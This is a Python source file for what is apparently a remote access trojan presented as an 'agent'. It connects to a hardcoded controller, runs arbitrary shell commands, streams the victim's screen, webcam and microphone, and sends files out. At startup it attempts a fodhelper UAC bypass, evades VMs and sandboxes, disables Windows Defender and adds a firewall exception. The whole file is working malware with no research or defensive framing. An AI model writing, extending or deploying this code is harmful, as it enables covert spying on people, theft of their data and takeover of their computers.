#!/usr/bin/env python3
"""
Improved Python Agent v2.1
Based on reference implementation with enhanced features and error handling
"""

import socketio
import requests
import time
import urllib3
import warnings

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

import uuid
import os
import subprocess
import threading
import mss
import numpy as np
import cv2
import sys
import random
try:
    import win32api
    import win32con
    import win32security
    import win32process
    import win32event
    import ctypes
    from ctypes import wintypes
    import winreg
    WINDOWS_AVAILABLE = True
except ImportError:
    WINDOWS_AVAILABLE = False
    
try:
    import pyaudio
    PYAUDIO_AVAILABLE = True
except ImportError:
    PYAUDIO_AVAILABLE = False
    
import base64
import tempfile
import pynput
from pynput import keyboard, mouse
try:
    import pygame
    PYGAME_AVAILABLE = True
except ImportError:
    PYGAME_AVAILABLE = False
    
import io
import wave
import socket
import json
import asyncio
try:
    import websockets
    WEBSOCKETS_AVAILABLE = True
except ImportError:
    WEBSOCKETS_AVAILABLE = False
    
try:
    import speech_recognition as sr
    SPEECH_RECOGNITION_AVAILABLE = True
except ImportError:
    SPEECH_RECOGNITION_AVAILABLE = False
    
import psutil
try:
    from PIL import Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False
    
import platform
try:
    import pyautogui
    PYAUTOGUI_AVAILABLE = True
except ImportError:
    PYAUTOGUI_AVAILABLE = False

# Configuration
SERVER_URL = "https://agent-controller.onrender.com"  # Change to your controller's URL
DEBUG_MODE = False  # Set to True for verbose logging

# --- Agent State ---
STREAMING_ENABLED = False
STREAM_THREAD = None
AUDIO_STREAMING_ENABLED = False
AUDIO_STREAM_THREAD = None
CAMERA_STREAMING_ENABLED = False
CAMERA_STREAM_THREAD = None

# --- Monitoring State ---
KEYLOGGER_ENABLED = False
KEYLOGGER_THREAD = None
KEYLOG_BUFFER = []
CLIPBOARD_MONITOR_ENABLED = False
CLIPBOARD_MONITOR_THREAD = None
CLIPBOARD_BUFFER = []
LAST_CLIPBOARD_CONTENT = ""

# --- Audio Config ---
CHUNK = 1024
FORMAT = None
if PYAUDIO_AVAILABLE:
    FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100

# --- WebSocket Client ---
sio = socketio.Client(
    ssl_verify=False,  # Disable SSL verification to prevent warnings
    engineio_logger=False,
    logger=False
)

def debug_log(message):
    """Log debug messages if debug mode is enabled."""
    if DEBUG_MODE:
        print(f"[DEBUG] {message}")

def obfuscate_strings():
    """Obfuscate sensitive strings to avoid static analysis."""
    # Simple XOR obfuscation for sensitive strings
    key = 0x42
    
    # Obfuscated strings (example)
    obfuscated = {
        'admin': ''.join(chr(ord(c) ^ key) for c in 'admin'),
        'elevate': ''.join(chr(ord(c) ^ key) for c in 'elevate'),
        'bypass': ''.join(chr(ord(c) ^ key) for c in 'bypass'),
        'privilege': ''.join(chr(ord(c) ^ key) for c in 'privilege')
    }
    
    return obfuscated

def sleep_random():
    """Random sleep to avoid pattern detection."""
    sleep_time = random.uniform(0.5, 2.0)
    time.sleep(sleep_time)

def get_or_create_agent_id():
    """
    Gets a unique agent ID from config directory or creates it.
    """
    if WINDOWS_AVAILABLE:
        config_path = os.getenv('APPDATA')
    else:
        config_path = os.path.expanduser('~/.config')
        
    os.makedirs(config_path, exist_ok=True)
    id_file_path = os.path.join(config_path, 'agent_id.txt')
    
    if os.path.exists(id_file_path):
        try:
            with open(id_file_path, 'r') as f:
                return f.read().strip()
        except Exception as e:
            debug_log(f"Error reading agent ID: {e}")
    
    # Create new agent ID
    agent_id = str(uuid.uuid4())
    try:
        with open(id_file_path, 'w') as f:
            f.write(agent_id)
        # Hide the file on Windows
        if WINDOWS_AVAILABLE:
            try:
                win32api.SetFileAttributes(id_file_path, win32con.FILE_ATTRIBUTE_HIDDEN)
            except Exception as e:
                debug_log(f"Could not hide agent ID file: {e}")
    except Exception as e:
        debug_log(f"Error creating agent ID file: {e}")
        
    return agent_id

def stream_screen(agent_id):
    """
    Captures the screen and streams it to the controller.
    This function runs in a separate thread.
    """
    global STREAMING_ENABLED
    url = f"{SERVER_URL}/stream/{agent_id}"
    headers = {'Content-Type': 'image/jpeg'}

    try:
        with mss.mss() as sct:
            while STREAMING_ENABLED:
                try:
                    # Get raw pixels from the screen
                    sct_img = sct.grab(sct.monitors[1])
                    
                    # Create an OpenCV image
                    img = np.array(sct_img)
                    
                    # Encode the image as JPEG with 70% quality
                    is_success, buffer = cv2.imencode(".jpg", img, [cv2.IMWRITE_JPEG_QUALITY, 70])
                    if not is_success:
                        continue

                    # Send the frame to the controller
                    response = requests.post(url, data=buffer.tobytes(), headers=headers, timeout=1)
                    if response.status_code != 200:
                        debug_log(f"Stream upload failed: {response.status_code}")
                    
                    # Control frame rate to ~10 FPS
                    time.sleep(0.1)
                except requests.exceptions.RequestException as e:
                    debug_log(f"Stream network error: {e}")
                    time.sleep(2)  # Wait before retrying
                except Exception as e:
                    debug_log(f"Stream error: {e}")
                    time.sleep(2)  # Wait before retrying
    except Exception as e:
        print(f"Critical stream error: {e}")
        STREAMING_ENABLED = False

def stream_camera(agent_id):
    """
    Captures the webcam and streams it to the controller.
    This function runs in a separate thread.
    """
    global CAMERA_STREAMING_ENABLED
    url = f"{SERVER_URL}/camera/{agent_id}"
    headers = {'Content-Type': 'image/jpeg'}

    cap = None
    try:
        # Use CAP_DSHOW on Windows for better device compatibility and performance.
        if WINDOWS_AVAILABLE:
            cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        else:
            cap = cv2.VideoCapture(0)
            
        if not cap.isOpened():
            print("Cannot open webcam")
            CAMERA_STREAMING_ENABLED = False
            return
            
        # Set camera properties for better performance
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
        cap.set(cv2.CAP_PROP_FPS, 10)
        
    except Exception as e:
        print(f"Could not open webcam: {e}")
        CAMERA_STREAMING_ENABLED = False
        return

    try:
        while CAMERA_STREAMING_ENABLED:
            try:
                ret, frame = cap.read()
                if not ret:
                    debug_log("Failed to read camera frame")
                    break
                    
                is_success, buffer = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
                if is_success:
                    response = requests.post(url, data=buffer.tobytes(), headers=headers, timeout=1)
                    if response.status_code != 200:
                        debug_log(f"Camera upload failed: {response.status_code}")
                        
                time.sleep(0.1)  # ~10 FPS
            except requests.exceptions.RequestException as e:
                debug_log(f"Camera network error: {e}")
                time.sleep(2)
            except Exception as e:
                debug_log(f"Camera stream error: {e}")
                break
    finally:
        if cap:
            cap.release()

def stream_audio(agent_id):
    """
    Captures microphone audio and streams it to the controller.
    This function runs in a separate thread.
    """
    global AUDIO_STREAMING_ENABLED
    
    if not PYAUDIO_AVAILABLE:
        print("PyAudio not available - cannot stream audio")
        AUDIO_STREAMING_ENABLED = False
        return
        
    url = f"{SERVER_URL}/audio/{agent_id}"
    
    p = None
    stream = None
    try:
        p = pyaudio.PyAudio()
        # --- Diagnostic: Print the default device to be used ---
        default_device_info = p.get_default_input_device_info()
        debug_log(f"Using audio device: {default_device_info['name']}")
        
        stream = p.open(
            format=FORMAT, 
            channels=CHANNELS, 
            rate=RATE, 
            input=True, 
            frames_per_buffer=CHUNK, 
            input_device_index=default_device_info['index']
        )
    except Exception as e:
        print(f"Could not open audio stream: {e}")
        AUDIO_STREAMING_ENABLED = False
        if p:
            p.terminate()
        return

    try:
        while AUDIO_STREAMING_ENABLED:
            try:
                data = stream.read(CHUNK)
                response = requests.post(url, data=data, timeout=1)
                if response.status_code != 200:
                    debug_log(f"Audio upload failed: {response.status_code}")
            except requests.exceptions.RequestException as e:
                debug_log(f"Audio network error: {e}")
                time.sleep(1)
            except Exception as e:
                debug_log(f"Audio stream error: {e}")
                break
    finally:
        if stream:
            stream.stop_stream()
            stream.close()
        if p:
            p.terminate()

def start_streaming(agent_id):
    global STREAMING_ENABLED, STREAM_THREAD
    if not STREAMING_ENABLED:
        STREAMING_ENABLED = True
        STREAM_THREAD = threading.Thread(target=stream_screen, args=(agent_id,))
        STREAM_THREAD.daemon = True
        STREAM_THREAD.start()
        print("Started video stream.")
        return "Video streaming started"

def stop_streaming():
    global STREAMING_ENABLED, STREAM_THREAD
    if STREAMING_ENABLED:
        STREAMING_ENABLED = False
        if STREAM_THREAD:
            STREAM_THREAD.join(timeout=2)
        STREAM_THREAD = None
        print("Stopped video stream.")
        return "Video streaming stopped"

def start_audio_streaming(agent_id):
    global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREAD
    if not AUDIO_STREAMING_ENABLED:
        AUDIO_STREAMING_ENABLED = True
        AUDIO_STREAM_THREAD = threading.Thread(target=stream_audio, args=(agent_id,))
        AUDIO_STREAM_THREAD.daemon = True
        AUDIO_STREAM_THREAD.start()
        print("Started audio stream.")
        return "Audio streaming started"

def stop_audio_streaming():
    global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREAD
    if AUDIO_STREAMING_ENABLED:
        AUDIO_STREAMING_ENABLED = False
        if AUDIO_STREAM_THREAD:
            AUDIO_STREAM_THREAD.join(timeout=2)
        AUDIO_STREAM_THREAD = None
        print("Stopped audio stream.")
        return "Audio streaming stopped"

def start_camera_streaming(agent_id):
    global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREAD
    if not CAMERA_STREAMING_ENABLED:
        CAMERA_STREAMING_ENABLED = True
        CAMERA_STREAM_THREAD = threading.Thread(target=stream_camera, args=(agent_id,))
        CAMERA_STREAM_THREAD.daemon = True
        CAMERA_STREAM_THREAD.start()
        print("Started camera stream.")
        return "Camera streaming started"

def stop_camera_streaming():
    global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREAD
    if CAMERA_STREAMING_ENABLED:
        CAMERA_STREAMING_ENABLED = False
        if CAMERA_STREAM_THREAD:
            CAMERA_STREAM_THREAD.join(timeout=2)
        CAMERA_STREAM_THREAD = None
        print("Stopped camera stream.")
        return "Camera streaming stopped"

# --- File Management Functions ---

def handle_file_upload(command_parts):
    """Handle file upload from controller."""
    try:
        if len(command_parts) < 3:
            return "Invalid upload command format"
        
        destination_path = command_parts[1]
        file_content_b64 = command_parts[2]
        
        # Decode base64 content
        file_content = base64.b64decode(file_content_b64)
        
        # Ensure directory exists
        os.makedirs(os.path.dirname(destination_path), exist_ok=True)
        
        # Write file
        with open(destination_path, 'wb') as f:
            f.write(file_content)
        
        return f"File uploaded successfully to {destination_path}"
    except Exception as e:
        return f"File upload failed: {e}"

def handle_file_download(command_parts, agent_id):
    """Handle file download request from controller."""
    try:
        if len(command_parts) < 2:
            return "Invalid download command format"
        
        file_path = command_parts[1]
        
        if not os.path.exists(file_path):
            return f"File not found: {file_path}"
        
        # Check file size (limit to 50MB for safety)
        file_size = os.path.getsize(file_path)
        if file_size > 50 * 1024 * 1024:  # 50MB
            return f"File too large: {file_size} bytes (max 50MB)"
        
        # Read file and encode as base64
        with open(file_path, 'rb') as f:
            file_content = base64.b64encode(f.read()).decode('utf-8')
        
        # Send file to controller
        filename = os.path.basename(file_path)
        url = f"{SERVER_URL}/file_upload/{agent_id}"
        response = requests.post(url, json={"filename": filename, "content": file_content}, timeout=30)
        
        if response.status_code == 200:
            return f"File {file_path} sent to controller successfully"
        else:
            return f"File upload failed with status: {response.status_code}"
            
    except Exception as e:
        return f"File download failed: {e}"

# --- Voice Communication Functions ---

def handle_voice_playback(command_parts):
    """Handle voice playback from controller."""
    try:
        if not PYGAME_AVAILABLE:
            return "Pygame not available - cannot play audio"
            
        if len(command_parts) < 2:
            return "Invalid voice command format"
        
        audio_content_b64 = command_parts[1]
        
        # Decode base64 audio
        audio_content = base64.b64decode(audio_content_b64)
        
        # Create temporary file
        with tempfile.NamedTemporaryFile(suffix='.wav', delete=False) as temp_file:
            temp_file.write(audio_content)
            temp_audio_path = temp_file.name
        
        # Initialize pygame mixer for audio playback
        pygame.mixer.init()
        pygame.mixer.music.load(temp_audio_path)
        pygame.mixer.music.play()
        
        # Wait for playback to finish
        while pygame.mixer.music.get_busy():
            time.sleep(0.1)
        
        # Clean up
        pygame.mixer.quit()
        os.unlink(temp_audio_path)
        
        return "Voice message played successfully"
    except Exception as e:
        return f"Voice playback failed: {e}"

def execute_command(command):
    """Executes a command and returns its output."""
    try:
        # Handle 'cd' command for changing directory
        if command.strip().startswith("cd "):
            try:
                # Extract the directory from the command
                new_dir = command.strip().split(" ", 1)[1]
                
                # Expand user path if needed
                if new_dir.startswith("~"):
                    new_dir = os.path.expanduser(new_dir)
                
                # Change the current working directory
                os.chdir(new_dir)
                
                # Return the new current directory
                return f"Changed directory to: {os.getcwd()}"
            except IndexError:
                return "Invalid 'cd' command: No directory specified."
            except FileNotFoundError:
                return f"Directory not found: {new_dir}"
            except Exception as e:
                return f"Failed to change directory: {e}"

        # Handle special commands
        if command.strip() == "pwd":
            return f"Current directory: {os.getcwd()}"
        
        if command.strip() == "whoami":
            try:
                if WINDOWS_AVAILABLE:
                    return subprocess.run(["whoami"], capture_output=True, text=True, timeout=5).stdout.strip()
                else:
                    return os.getlogin()
            except:
                return "Unknown user"

        if WINDOWS_AVAILABLE:
            # Explicitly use PowerShell to execute commands on Windows
            result = subprocess.run(
                ["powershell.exe", "-NoProfile", "-Command", command],
                capture_output=True,
                text=True,
                timeout=30,
                creationflags=subprocess.CREATE_NO_WINDOW,
                cwd=os.getcwd()  # Execute in the current directory
            )
        else:
            # Use bash on Linux/Unix systems
            result = subprocess.run(
                ["bash", "-c", command],
                capture_output=True,
                text=True,
                timeout=30,
                cwd=os.getcwd()  # Execute in the current directory
            )
        
        output = result.stdout + result.stderr
        if not output:
            return f"[No output from command] Return code: {result.returncode}"
        return output
    except subprocess.TimeoutExpired:
        return "Command timed out after 30 seconds"
    except Exception as e:
        return f"Command execution failed: {e}"

def is_admin():
    """Check if the script is running with administrator privileges."""
    if not WINDOWS_AVAILABLE:
        return False
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def elevate_privileges_fodhelper():
    """Attempt to elevate privileges using fodhelper.exe UAC bypass."""
    if not WINDOWS_AVAILABLE:
        debug_log("Not on Windows, cannot attempt UAC bypass.")
        return False

    try:
        current_script_path = os.path.abspath(sys.argv[0])
        # Registry path for fodhelper.exe bypass
        reg_path = r"Software\Classes\ms-settings\shell\open\command"

        # Create registry keys
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        winreg.SetValueEx(key, None, 0, winreg.REG_SZ, current_script_path)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)

        debug_log(f"Registry key for fodhelper.exe created: {current_script_path}")

        # Execute fodhelper.exe
        subprocess.Popen(["fodhelper.exe"], creationflags=subprocess.CREATE_NO_WINDOW)

        # Clean up registry keys after a short delay
        time.sleep(5)  # Give fodhelper time to launch
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
            debug_log("Cleaned up fodhelper.exe registry keys.")
        except Exception as e:
            debug_log(f"Could not clean up fodhelper.exe registry keys: {e}")

        return True
    except Exception as e:
        debug_log(f"Failed to elevate privileges using fodhelper.exe: {e}")
        return False

def modify_registry():
    """Create a marker value in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for demo."""
    if not WINDOWS_AVAILABLE:
        return False
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
        winreg.SetValueEx(key, "AgentMarker", 0, winreg.REG_SZ, "AgentWasHere")
        winreg.CloseKey(key)
        debug_log("Registry marker set.")
        return True
    except Exception as e:
        debug_log(f"Registry modification failed: {e}")
        return False

def disable_defender():
    """Attempt to disable Windows Defender via registry and PowerShell."""
    if not WINDOWS_AVAILABLE:
        return False
    try:
        # Registry method
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender")
        winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        # PowerShell method
        subprocess.run([
            'powershell.exe', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true'
        ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
        debug_log("Defender disable attempted.")
        return True
    except Exception as e:
        debug_log(f"Defender disable failed: {e}")
        return False

def anti_analysis_vm():
    """Detect VM or analysis environment."""
    try:
        # Check for common VM process names
        vm_names = ['vboxservice.exe', 'vboxtray.exe', 'vmtoolsd.exe', 'vmwaretray.exe', 'vmwareuser.exe', 'vmsrvc.exe', 'vmusrvc.exe']
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] and proc.info['name'].lower() in vm_names:
                debug_log("VM process detected. Exiting.")
                return False
        
        # Check for no mouse movement (sandbox) - only on Windows
        if WINDOWS_AVAILABLE:
            try:
                import win32gui
                pos1 = win32gui.GetCursorPos()
                time.sleep(2)
                pos2 = win32gui.GetCursorPos()
                if pos1 == pos2:
                    debug_log("No mouse movement detected. Possible sandbox.")
                    return False
            except:
                pass
        
        debug_log("Anti-analysis checks passed.")
        return True
    except Exception as e:
        debug_log(f"Anti-analysis failed: {e}")
        return True  # Continue execution on error

def add_firewall_exception():
    """Add this agent to the Windows Firewall allowed list."""
    if not WINDOWS_AVAILABLE:
        return False
    try:
        exe_path = sys.executable
        rule_name = f"AgentFirewallRule_{uuid.uuid4()}"
        result = subprocess.run([
            'netsh', 'advfirewall', 'firewall', 'add', 'rule',
            f'name={rule_name}', 'dir=in', 'action=allow', f'program={exe_path}'
        ], creationflags=subprocess.CREATE_NO_WINDOW, capture_output=True, timeout=10)
        
        if result.returncode == 0:
            debug_log("Firewall exception added.")
            return True
        else:
            debug_log(f"Firewall exception failed: {result.stderr}")
            return False
    except Exception as e:
        debug_log(f"Firewall exception failed: {e}")
        return False

# --- SocketIO Event Handlers ---

@sio.event
def connect():
    agent_id = get_or_create_agent_id()
    print(f"Connected to server. Registering with agent_id: {agent_id}")
    sio.emit('agent_connect', {'agent_id': agent_id})

@sio.event
def disconnect():
    print("Disconnected from server.")

@sio.on('command')
def on_command(data):
    agent_id = get_or_create_agent_id()
    command = data.get("command", "").strip()
    output = ""

    if not command:
        return

    debug_log(f"Received command: {command}")

    # Internal commands
    internal_commands = {
        "start-stream": lambda: start_streaming(agent_id),
        "stop-stream": stop_streaming,
        "start-audio": lambda: start_audio_streaming(agent_id),
        "stop-audio": stop_audio_streaming,
        "start-camera": lambda: start_camera_streaming(agent_id),
        "stop-camera": stop_camera_streaming,
    }

    try:
        if command in internal_commands:
            output = internal_commands[command]() or f"Executed: {command}"
        elif command.startswith("upload-file:"):
            output = handle_file_upload(command.split(":", 2))
        elif command.startswith("download-file:"):
            output = handle_file_download(command.split(":", 1), agent_id)
        elif command.startswith("play-voice:"):
            output = handle_voice_playback(command.split(":", 1))
        elif command == "sleep":
            output = "Agent sleeping..."
        else:
            output = execute_command(command)
    except Exception as e:
        output = f"Error executing command: {e}"
    
    if output:
        sio.emit('command_result', {'agent_id': agent_id, 'output': output})

def cleanup_resources():
    """Clean up all resources before shutdown."""
    try:
        stop_streaming()
        stop_audio_streaming()
        stop_camera_streaming()
        debug_log("Resources cleaned up successfully")
    except Exception as e:
        debug_log(f"Error during cleanup: {e}")

def main():
    """Main function to start the agent."""
    print("=" * 60)
    print("Improved Python Agent v2.1")
    print("Starting up...")
    print("=" * 60)
    
    # Initialize agent with error handling
    try:
        if WINDOWS_AVAILABLE:
            print("Running on Windows - initializing Windows-specific features...")
            
            # Check admin privileges
            if not is_admin():
                print("[INFO] Not running as administrator. Attempting to elevate...")
                if elevate_privileges_fodhelper():
                    print("[INFO] Elevation attempt completed")
                else:
                    print("[WARN] Elevation attempt failed")
            else:
                print("[OK] Running with administrator privileges")
            
            # Run Windows-specific setup
            if anti_analysis_vm():
                modify_registry()
                disable_defender()
                add_firewall_exception()
            else:
                print("[WARN] VM/Analysis environment detected - skipping some setup")
        else:
            print("Running on non-Windows system")
        
        # Get or create agent ID
        agent_id = get_or_create_agent_id()
        print(f"[OK] Agent starting with ID: {agent_id}")
        
        print("Initializing connection to server...")
        
        # Main connection loop with improved error handling
        connection_attempts = 0
        max_attempts = 50  # Prevent infinite loops
        
        while connection_attempts < max_attempts:
            try:
                connection_attempts += 1
                print(f"Connecting to server (attempt {connection_attempts})...")
                sio.connect(SERVER_URL, wait_timeout=10)
                print("[OK] Connected to server successfully!")
                sio.wait()
            except socketio.exceptions.ConnectionError as e:
                print(f"[WARN] Connection failed (attempt {connection_attempts}): {e}")
                if connection_attempts >= max_attempts:
                    print("[ERROR] Maximum connection attempts reached. Exiting.")
                    break
                time.sleep(min(10, connection_attempts * 2))  # Exponential backoff
            except KeyboardInterrupt:
                print("\n[INFO] Received interrupt signal. Shutting down gracefully...")
                break
            except Exception as e:
                print(f"[ERROR] An unexpected error occurred: {e}")
                cleanup_resources()
                
                if connection_attempts >= max_attempts:
                    print("[ERROR] Maximum connection attempts reached. Exiting.")
                    break
                    
                print("Retrying in 10 seconds...")
                time.sleep(10)
    
    except KeyboardInterrupt:
        print("\n[INFO] Agent shutdown requested.")
    except Exception as e:
        print(f"[ERROR] Critical error during startup: {e}")
    finally:
        print("[INFO] Agent shutting down.")
        cleanup_resources()
        try:
            if sio.connected:
                sio.disconnect()
        except:
            pass

if __name__ == "__main__":
    main()